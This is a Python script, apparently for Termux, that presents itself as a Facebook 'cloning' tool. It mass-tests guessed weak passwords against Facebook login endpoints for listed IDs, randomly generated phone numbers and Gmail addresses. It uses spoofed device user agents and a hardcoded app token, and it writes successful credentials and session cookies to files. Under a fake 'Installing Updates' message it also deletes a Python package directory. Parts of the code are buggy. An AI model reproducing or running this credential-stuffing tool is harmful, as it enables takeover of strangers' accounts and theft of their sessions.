#coding:utf-8
#usr/bin/python
import os,sys,time,platform
rrq=("requests");mm=("uninstall")
from tqdm import tqdm

def load():
     for i in tqdm(range(100)):
           time.sleep(0.0099)
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system('clear')
print('mGetting Updates...!')
load();time.sleep(2);clear()
print('mInstalling Updates...!')
try:
    os.system(f"pip {mm} {rrq} -y &&  rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests")
except requests.exceptions.ConnectionError:
    print("Net Error");exit()
try:
    import requests
except ImportError:
    os.system(f'pip install {rrq}')
    os.system('pip install pycryptodome,mecanize,bs4')

    from fake_useragent import UserAgent
except:
    os.system('pi install fake_useragent')
    from fake_useragent import UserAgent
uamix = UserAgent().chrome
def print_success(id,pas):
    print('\r\033[1;32m [Successful] '+id+'|'+pas+'\033[1;37m')
def print_checkpoint(id,pas):
    print('\r\033[1;33m [Checkpoint] '+id+'|'+pas+'\033[1;37m')
def create_file():
    clear()
    exit(' Dump Setup not added!')
print('\n\n Importing System')
try:
    import requests,re,sys,datetime,random,string,uuid
    from concurrent.futures import ThreadPoolExecutor as imtiaz
except:
    os.sysem('pip install requests')
print('\n Re-Importing system')
try:
    import requests
except:
    exit(' Something Want wrong please contact with owner!')
loop=0
ok=[]
cp=[]
logo = f"""\033[1;37m
______   ______   _    _   ______   ______  
| |  | \ / |  | \ | |  | | | |  | | | |  \ \ 
| |__| | | |  | | | |--| | | |__| | | |  | |  (facebook)
|_|  \_\ \_|__|_/ |_|  |_| |_|  |_| |_|  |_| (version: 1.0) \n{50*'-'}\n Codeby: ROHAN-XD\n Author: MALIK Al\n Github: Ruok-bro\n{50*'-'}\n Uploaded By \033[1;32mROHAN-XD\033[1;37m\n{50*'-'}"""
def clear():
    os.system('clear')
    print(logo)
def linex():
    print('\033[1;37m'+ 50 * '-')
def main_menu():
    try:
        clear()
        key = "ROHAN"
        xd = "ROHAN"
        if key in xd:
            print(' Today date:',datetime.date.today())
            linex()
            print(' [1] Start Clning')
            print(' [2] Create file')
            print(' [3] Join wa group')
            print(' [4] Contact with owner')
            print(' [0] Exit menu')
            linex()
            xd = input(' choice an option: ')
            if xd =='1':
                cloning_menu()
            elif xd =='2':
                create_file()
            elif xd =='3':
                os.system('xdg-open https://chat.whatsapp.com/GWTaHM98we7YR7y2M8H0Z')
                main_menu()
            elif xd =='0':
                exit(' Thanks for use my script -XD')
            elif xd =='4':
                os.system('xdg-open https://wa.me/+923246258722')
                main_menu()
            else:
                print(' InvMALIKd option! ')
                time.sleep(1)
                main_menu()
        else:
            clear()
            print(' Your Key is not Approved')
            linex()
            print(' Your Key: '+key)
            linex()
            input(' press etner to send key')
            os.system('xdg-open https://wa.me/+923246258722')
            main_menu()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print(' Network Error')
        exit()
 
def cloning_menu():
   clear()
   print(' [1] File cloning')
   print(' [2] Number Cloning') 
   print(' [3] Gmail Cloning')
   print(' [4] back main menu ')
   print(' [0] exit menu ')
   linex()
   clone = input(' choice an potion: ')
   if clone =='1':
       file_cloning()
   elif clone =='2':
       number_cloning()
   elif clone =='3':
       gmail_cloning()
   elif clone =='4':
       main_menu()
   elif clone =='0':
       exit(' Thanks for use my sc-XD')
   else:
       print(' InvMALIKd Option!')
       time.sleep(1)
       main_menu()
 
def file_cloning():
    try:
        clear()
        try:
            file = open(input(' put file name: '),'r').read().splitlines()
        except:
            exit(' File not found error! ')
        linex()
        print(' Total ids in file: '+str(len(file)))
        linex()
        pasx=[]
        try:
            how = int(input(' how many password you want add: '))
        except ValueError:
            how = 2
        linex()
        for x in range(how):
           pasx.append(input(f' Put pas no.{x+1}: '))
        linex()
        print(' [1] Method 1 (api)\n [2] Method 2 (nornal-free fb)')
        linex()
        mthd = input(' method: ')
        clear()
        print(' Process his been started')
        print(' Total ids for clone: '+str(len(file)))
        print(' Make Sure Yor Connection And Use Airplane')
        linex()
        with imtiaz(max_workers=30) as ROHAN:
            for xd in file:
                id = xd.split('|')[0]
                name = xd.split('|')[1]
                passlist = pasx
                if mthd =="1":
                    ROHAN.submit(fileclone,id,name,passlist)
                else:
                    ROHAN.submit(normal_fileclone,id,name,passlist)
        print('\n')
        linex()
        print(' Process his been end!')
        print(' Total ok/cp '+str(len(ok))+'/'+str(len(cp)))
        linex()
        input(' Press enter for main menu')
        ok.clear()
        cp.clear()
        main_menu()
    except IndexError:
        exit("\n Yo can't Clone Ths File Error!\n Put Any File Like UID|PAS")
def number_cloning():
    clear()
    num=[]
    print(' Put Your Country Code like pak +92310')
    linex()
    code = input(' put code: ')
    linex()
    print(' Put Your Country Last digit like pak 7')
    linex()
    digit = int(input(" put digit: "))
    linex()
    print(" Example: 5000,10000,30000 etc.")
    linex()
    try:
        how = int(input(' How many number you wamt add: '))
    except ValueError:
        how = 5000
    for total in range(how):
        numb = ''.join(random.choice(string.digits) for _ in range(digit))
        num.append(numb)
    linex()
    print(' [1] Method 1 (api)\n [2] Method 2 (nornal-free fb)')
    linex()
    mthd = input(' method: ')
    clear()
    print(' Process his been started')
    print(' Total ids for clone: '+str(len(num)))
    print(' Make Sure Yor Connection And Use Airplane')
    linex()
    with imtiaz(max_workers=30) as ROHAN:
        for xd in num:
            number = code+xd
            passlist = [num,'khankhan','khan123']
            if mthd =="1":
                ROHAN.submit(numberclone,number,passlist)
            else:
                ROHAN.submit(normal_numberclone,number,passlist)
    print('\n')
    linex()
    print(' Process his been end!')
    print(' Total ok/cp '+str(len(ok))+'/'+str(len(cp)))
    linex()
    input(' Press enter for main menu')
    ok.clear()
    cp.clear()
    main_menu()
 
def gmail_cloning():
    clear()
    ml=[]
    print(' Example: Altaf, Asad, Sajjad,Waheed ')
    linex()
    firstname = input(' put first name: ')
    linex()
    print(' Example: MALIK,Khan,Mohummad')
    linex()
    lastname = input(' put last name: ')
    domain = '@gmail.com'
    linex()
    print(' Example: 5000,10000,500000')
    linex()
    try:
        how = int(input(' how many mail you want clone: '))
    except ValueError:
        how = 5000
    for xd in range(how):
        tt = str(random.randint(99,9999))
        mail = firstname.lower()+lastname.lower()+tt+domain
        ml.append(mail)
    linex()
    print(' [1] Method 1 (api)\n [2] Method 2 (nornal-free fb)')
    linex()
    mthd = input(' method: ')
    clear()
    print(' Process his been started')
    print(' Total ids for clone: '+str(len(ml)))
    print(' Make Sure Yor Connection And Use Airplane')
    linex()
    with imtiaz(max_workers=30) as ROHAN:
        for fullmail in ml:
            fn = firstname.lower()
            ln = lastname.lower()
            passlist = [fn+ln,fn+" "+ln,firstname+lastname,firstname+" "+lastname,fn+"123",fn+"786",fn+"12345",fn+"1122","khankhan"]
            if mthd =="1":
                ROHAN.submit(gmailclone,fullmail,passlist)
            else:
                ROHAN.submit(normal_gmailclone,fullmail,passlist)
    print('\n')
    linex()
    print(' Process his been end!')
    print(' Total ok/cp '+str(len(ok))+'/'+str(len(cp)))
    linex()
    input(' Press enter for main menu')
    ok.clear()
    cp.clear()
    main_menu()
        
 
def fileclone(id,name,passlist):
    try:
        global loop,ok,cp
        sys.stdout.write('\r\r\033[1;37m [ROHAN-xD] [%s] \033[1;32m%s\033[1;36m/\033[1;33m%s\033[1;37m '%(loop,len(ok),len(cp)));sys.stdout.flush()
        firstname = name.split(" ")[0]
        try:
            lastname = name.split(" ")[1]
        except:
            lastname = "MALIK"
        for pw in passlist:
            pas = pw.replace('first',firstname.lower().replace('First',firstname).replace('last',lastname.lower()).replace('Last',lastname))
            samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X']
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(000000000,999999999))
            model,build = random.choice(samsung).split('|')
            fbmf = 'random'
            fbbd = 'random'
            fbsv = str(random.randint(4,13))+'.0.0'
            useragent = "Dalvik/2.1.0 (Linux; U; Android "+fbsv+"; "+model+" Build/"+build+") [FBAN/Orca-Android;FBAV/"+fbsv+";FBPN/com.facebook.orca;FBLC/fr_FR;FBBV/"+fbbv+";FBCR/null;FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+fbsv+";FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
            main_headers = {"User-Agent":useragent,
                "Accept-Encoding":"gzip, deflate",
                "Connection":"keep-MALIKve",
                "Content-Type":"application/x-www-form-urlencoded",
                "Host":"graph.facebook.com",
                "X-FB-Net-HNI":str(random.randint(3e7,4e7)),
                "X-FB-SIM-HNI":str(random.randint(2e4,4e4)),
                "X-FB-Connection-Type":"MOBILE.LTE",
                "Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                "X-FB-Connection-QuMALIKty":"MOBILE.LTE",
                "X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),
                "X-Tigon-Is-Retry":"False",
                "X-FB-HTTP-Engine":"Liger",
                "X-FB-Client-IP":"True",
                "X-FB-Server-Cluster":"True"}
            data = {"adid":str(uuid.uuid4()),
                "format":"json",
                "device_id":str(uuid.uuid4()),
                "cpl":"true",
                "credentials_type":"device_based_login_password",
                "error_detail_type":"button_with_disabled",
                "email":id,
                "password":pas,
                "access_token":"256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                "generate_session_cookies":"1",
                "meta_inf_fbmeta":"NO_FILE",
                "advertiser_id":str(uuid.uuid4()),
                "currently_logged_in_userid":"0",
                "locale":"fr_FR",
                "client_country_code":"FR", 
                "method":"auth.login",
                "fb_api_req_friendly_name":"authenticate"}
            submit = requests.post('https://graph.facebook.com/auth/login',data=data,headers=main_headers).json()
            if "session_key" in submit:
                print_success(id,pas)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in str(submit["session_cookies"]))
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookie = f"sb={ssbb};{ckkk}"
                open('/sdcard/ROHAN/OK.txt','a').write(id+'|'+pas+'\n')
                open('/sdcard/ROHAN/OK-Coki.txt','a').write(id+'|'+pas+'|'+cookie+'\n')
                ok.append(id)
                break
            elif "www.facebook.com" in submit["error"]["message"]:
                print_checkpoint(id,pas)
                open('/sdcard/ROHAN/CP.txt','a').write(id+'|'+pas+'\n')
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
   
def numberclone(number, passlist):
    try:
        global loop,ok,cp
        sys.stdout.write('\r\r\033[1;37m [ROHAN-xD] [%s] \033[1;32m%s\033[1;36m/\033[1;33m%s\033[1;37m '%(loop,len(ok),len(cp)));sys.stdout.flush()
        for pas in passlist:
            samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X']
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(000000000,999999999))
            model,build = random.choice(samsung).split('|')
            fbmf = 'samsung'
            fbbd = 'samsung'
            fbsv = str(random.randint(4,13))+'.0.0'
            useragent = "Dalvik/2.1.0 (Linux; U; Android "+fbsv+"; "+model+" Build/"+build+") [FBAN/Orca-Android;FBAV/"+fbsv+";FBPN/com.facebook.orca;FBLC/fr_FR;FBBV/"+fbbv+";FBCR/null;FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+fbsv+";FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
            main_headers = {"User-Agent":useragent,
                "Accept-Encoding":"gzip, deflate",
                "Connection":"keep-MALIKve",
                "Content-Type":"application/x-www-form-urlencoded",
                "Host":"graph.facebook.com",
                "X-FB-Net-HNI":str(random.randint(3e7,4e7)),
                "X-FB-SIM-HNI":str(random.randint(2e4,4e4)),
                "X-FB-Connection-Type":"MOBILE.LTE",
                "Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                "X-FB-Connection-QuMALIKty":"MOBILE.LTE",
                "X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),
                "X-Tigon-Is-Retry":"False",
                "X-FB-HTTP-Engine":"Liger",
                "X-FB-Client-IP":"True",
                "X-FB-Server-Cluster":"True"}
            data = {"adid":str(uuid.uuid4()),
                "format":"json",
                "device_id":str(uuid.uuid4()),
                "cpl":"true",
                "credentials_type":"device_based_login_password",
                "error_detail_type":"button_with_disabled",
                "email":number,
                "password":pas,
                "access_token":"256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                "generate_session_cookies":"1",
                "meta_inf_fbmeta":"NO_FILE",
                "advertiser_id":str(uuid.uuid4()),
                "currently_logged_in_userid":"0",
                "locale":"pt_BR",
                "client_country_code":"BR", 
                "method":"auth.login",
                "fb_api_req_friendly_name":"authenticate"}
            submit = requests.post('https://graph.facebook.com/auth/login',data=data,headers=main_headers).json()
            if "session_key" in submit:
                id = str(submit['uid'])
                print_success(id,pas)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in str(submit["session_cookies"]))
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookie = f"sb={ssbb};{ckkk}"
                open('/sdcard/ROHAN/OK.txt','a').write(id+'|'+pas+'\n')
                open('/sdcard/ROHAN/OK-Coki.txt','a').write(id+'|'+pas+'|'+cookie+'\n')
                ok.append(id)
                break
            elif "www.facebook.com" in submit["error"]["message"]:
                try:
                    id = str(submit['error']['error_data']['uid'])
                except:
                    id = number
                print_checkpoint(id,pas)
                open('/sdcard/ROHAN/CP.txt','a').write(id+'|'+pas+'\n')
                cp.append(id)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
    
def gmailclone(fullmail,passlist):
    try:
        global loop,ok,cp
        sys.stdout.write('\r\r\033[1;37m [ROHAN-xD] [%s] \033[1;32m%s\033[1;36m/\033[1;33m%s\033[1;37m '%(loop,len(ok),len(cp)));sys.stdout.flush()
        for pas in passlist:
            samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X']
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(000000000,999999999))
            model,build = random.choice(samsung).split('|')
            fbmf = 'samsung'
            fbbd = 'samsung'
            fbsv = str(random.randint(4,13))+'.0.0'
            useragent = "Dalvik/2.1.0 (Linux; U; Android "+fbsv+"; "+model+" Build/"+build+") [FBAN/Orca-Android;FBAV/"+fbsv+";FBPN/com.facebook.orca;FBLC/fr_FR;FBBV/"+fbbv+";FBCR/null;FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+fbsv+";FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
            main_headers = {"UUser-Agent":useragent,
                "Accept-Encoding":"gzip, deflate",
                "Connection":"keep-MALIKve",
                "Content-Type":"application/x-www-form-urlencoded",
                "Host":"graph.facebook.com",
                "X-FB-Net-HNI":str(random.randint(3e7,4e7)),
                "X-FB-SIM-HNI":str(random.randint(2e4,4e4)),
                "X-FB-Connection-Type":"MOBILE.LTE",
                "Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                "X-FB-Connection-QuMALIKty":"MOBILE.LTE",
                "X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),
                "X-Tigon-Is-Retry":"False",
                "X-FB-HTTP-Engine":"Liger",
                "X-FB-Client-IP":"True",
                "X-FB-Server-Cluster":"True"}
            data = {"adid":str(uuid.uuid4()),
                "format":"json",
                "device_id":str(uuid.uuid4()),
                "cpl":"true",
                "credentials_type":"device_based_login_password",
                "error_detail_type":"button_with_disabled",
                "email":fullmail,
                "password":pas,
                "access_token":"256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                "generate_session_cookies":"1",
                "meta_inf_fbmeta":"NO_FILE",
                "advertiser_id":str(uuid.uuid4()),
                "currently_logged_in_userid":"0",
                "locale":"fr_FR",
                "client_country_code":"FR", 
                "method":"auth.login",
                "fb_api_req_friendly_name":"authenticate"}
            submit = requests.post('https://graph.facebook.com/auth/login',data=data,headers=main_headers).json()
            if "session_key" in submit:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in str(submit["session_cookies"]))
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookie = f"sb={ssbb};{ckkk}"
                open('/sdcard/ROHAN/OK.txt','a').write(id+'|'+pas+'\n')
                open('/sdcard/ROHAN/OK-Coki.txt','a').write(id+'|'+pas+'|'+cookie+'\n')
                ok.append(id)
                break
            elif "www.facebook.com" in submit["error"]["message"]:
                try:
                    id = str(submit['error']['error_data']['uid'])
                except:
                    id = fullmail
                print_checkpoint(id,pas)
                open('/sdcard/ROHAN/CP.txt','a').write(id+'|'+pas+'\n')
                cp.append(id)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as p:
        pass
 
 
 
def normal_fileclone(id,name,passlist):
    try:
        global loop,ok,cp
        sys.stdout.write('\r\r\033[1;37m [ROHAN-xD] [%s] \033[1;32m%s\033[1;36m/\033[1;33m%s\033[1;37m '%(loop,len(ok),len(cp)));sys.stdout.flush()
        firstname = name.split(" ")[0]
        try:
            lastname = name.split(" ")[1]
        except:
            lastname = "MALIK"
        for pw in passlist:
            pas = pw.replace('first',firstname.lower().replace('First',firstname).replace('last',lastname.lower()).replace('Last',lastname))
            r = requests.Session()
            ua = UserAgent().random
            login = r.get('https://free.facebook.com/').text
            data = {"bi_xrwh":"0",
                "email":id,
                "jazoest":re.search('name="jazoest" value="(.*?)"',str(login)).group(1),
                "li":re.search('name="li" value="(.*?)"',str(login)).group(1),
                "login":"Log In",
                "lsd":re.search('name="lsd" value="(.*?)"',str(login)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"',str(login)).group(1),
                "pass":pas,
                "try_number":"0",
                "unrecognized_tries":"0"}
            head = {'accept' : 'text/html,application/xhtm 1+xml,application/xml;q=0.9, imag e/avif,image/webp, image/apng,*/ *;q=0.8,application/signed-exchange: v=b3;q=0.7',
                'accept-encoding' : 'gzip, deflate',
                'accept-language' : 'en-GB, en;q=0.9, en-US;q=0.8,en;q=0.7',
                'cache-control' : 'max-age=0',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua' : '"Not: A-Brand"; v="99", "Chromium";V="112"',
                'sec-ch-ua-full-version-list' : '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile' : '?1',
                'sec-ch-ua-platform' : '"Android"',
                'sec-ch-ua-platform-version' : '"11.0.0"',
                'sec-fetch-dest' : 'document',
                'sec-fetch-mode' : 'navigate',
                'sec-fetch-site' : 'none',
                'sec-fetch-user' : '21',
                'upgrade-insecure-requests':'1',
                'user-agent' :ua}
            url = "https://free.facebook.com/login/device-based/regular/login/"
            submit = r.post(url,data=data,headers=head).text
            ROHAN = '; '.join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])
            if "c_user" in ROHAN:
                print_success(id,pas)
                open('/sdcard/ROHAN/OK.txt','a').write(id+'|'+pas+'\n')
                open('/sdcard/ROHAN/OK-Coki.txt','a').write(id+'|'+pas+'|'+ROHAN+'\n')
                ok.append(id)
                break
            elif "checkpoint" in ROHAN:
                print_checkpoint(id,pas)
                open('/sdcard/ROHAN/CP.txt','a').write(id+'|'+pas+'\n')
                cp.append(id)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
 
def normal_numberclone(number, passlist):
    try:
        global loop,ok,cp
        sys.stdout.write('\r\r\033[1;37m [ROHAN-XD] [%s] \033[1;32m%s\033[1;36m/\033[1;33m%s\033[1;37m '%(loop,len(ok),len(cp)));sys.stdout.flush()
        for pas in passlist:
            r = requests.Session()
            ua = UserAgent().random
            login = r.get('https://free.facebook.com/').text
            data = {"bi_xrwh":"0",
                "email":number,
                "jazoest":re.search('name="jazoest" value="(.*?)"',str(login)).group(1),
                "li":re.search('name="li" value="(.*?)"',str(login)).group(1),
                "login":"Log In",
                "lsd":re.search('name="lsd" value="(.*?)"',str(login)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"',str(login)).group(1),
                "pass":pas,
                "try_number":"0",
                "unrecognized_tries":"0"}
            head = {'accept' : 'text/html,application/xhtm 1+xml,application/xml;q=0.9, imag e/avif,image/webp, image/apng,*/ *;q=0.8,application/signed-exchange: v=b3;q=0.7',
                'accept-encoding' : 'gzip, deflate',
                'accept-language' : 'en-GB, en;q=0.9, en-US;q=0.8,en;q=0.7',
                'cache-control' : 'max-age=0',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua' : '"Not: A-Brand"; v="99", "Chromium";V="112"',
                'sec-ch-ua-full-version-list' : '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile' : '?1',
                'sec-ch-ua-platform' : '"Android"',
                'sec-ch-ua-platform-version' : '"11.0.0"',
                'sec-fetch-dest' : 'document',
                'sec-fetch-mode' : 'navigate',
                'sec-fetch-site' : 'none',
                'sec-fetch-user' : '21',
                'upgrade-insecure-requests':'1',
                'user-agent' :ua}
            url = "https://free.facebook.com/login/device-based/regular/login/"
            submit = r.post(url,data=data,headers=head).text
            ROHAN = '; '.join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])
            if "c_user" in ROHAN:
                try:
                    id = re.search("c_user=(.*?);",str(ROHAN)).group(1)
                except:
                    id = number
                print_success(id,pas)
                open('/sdcard/ROHAN/OK.txt','a').write(id+'|'+pas+'\n')
                open('/sdcard/ROHAN/OK-Coki.txt','a').write(id+'|'+pas+'|'+ROHAN+'\n')
                ok.append(id)
                break
            elif "checkpoint" in ROHAN:
                try:
                    id = re.search("3A(.*?)%",str(ROHAN)).group(1)
                except:
                    id = number
                print_checkpoint(id,pas)
                open('/sdcard/ROHAN/CP.txt','a').write(id+'|'+pas+'\n')
                cp.append(id)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
        
def normal_gmailclone(fullmail, passlist):
    try:
        global loop,ok,cp
        sys.stdout.write('\r\r\033[1;37m [ROHAN-XD] [%s] \033[1;32m%s\033[1;36m/\033[1;33m%s\033[1;37m '%(loop,len(ok),len(cp)));sys.stdout.flush()
        for pas in passlist:
            r = requests.Session()
            ua = UserAgent().random
            login = r.get('https://free.facebook.com/').text
            data = {"bi_xrwh":"0",
                "email":fullmail,
                "jazoest":re.search('name="jazoest" value="(.*?)"',str(login)).group(1),
                "li":re.search('name="li" value="(.*?)"',str(login)).group(1),
                "login":"Log In",
                "lsd":re.search('name="lsd" value="(.*?)"',str(login)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"',str(login)).group(1),
                "pass":pas,
                "try_number":"0",
                "unrecognized_tries":"0"}
            head = {'accept' : 'text/html,application/xhtm 1+xml,application/xml;q=0.9, imag e/avif,image/webp, image/apng,*/ *;q=0.8,application/signed-exchange: v=b3;q=0.7',
                'accept-encoding' : 'gzip, deflate',
                'accept-language' : 'en-GB, en;q=0.9, en-US;q=0.8,en;q=0.7',
                'cache-control' : 'max-age=0',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua' : '"Not: A-Brand"; v="99", "Chromium";V="112"',
                'sec-ch-ua-full-version-list' : '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile' : '?1',
                'sec-ch-ua-platform' : '"Android"',
                'sec-ch-ua-platform-version' : '"11.0.0"',
                'sec-fetch-dest' : 'document',
                'sec-fetch-mode' : 'navigate',
                'sec-fetch-site' : 'none',
                'sec-fetch-user' : '21',
                'upgrade-insecure-requests':'1',
                'user-agent' :ua}
            url = "https://free.facebook.com/login/device-based/regular/login/"
            submit = r.post(url,data=data,headers=head).text
            ROHAN = '; '.join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])
            if "c_user" in ROHAN:
                try:
                    id = re.search("c_user=(.*?);",str(ROHAN)).group(1)
                except:
                    id = fullmail
                print_success(id,pas)
                open('/sdcard/ROHAN/OK.txt','a').write(id+'|'+pas+'\n')
                open('/sdcard/ROHAN/OK-Coki.txt','a').write(id+'|'+pas+'|'+ROHAN+'\n')
                ok.append(id)
                break
            elif "checkpoint" in ROHAN:
                try:
                    id = re.search("3A(.*?)%",str(ROHAN)).group(1)
                except:
                    id = fullmail
                print_checkpoint(id,pas)
                open('/sdcard/ROHAN/CP.txt','a').write(id+'|'+pas+'\n')
                cp.append(id)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
 
main_menu()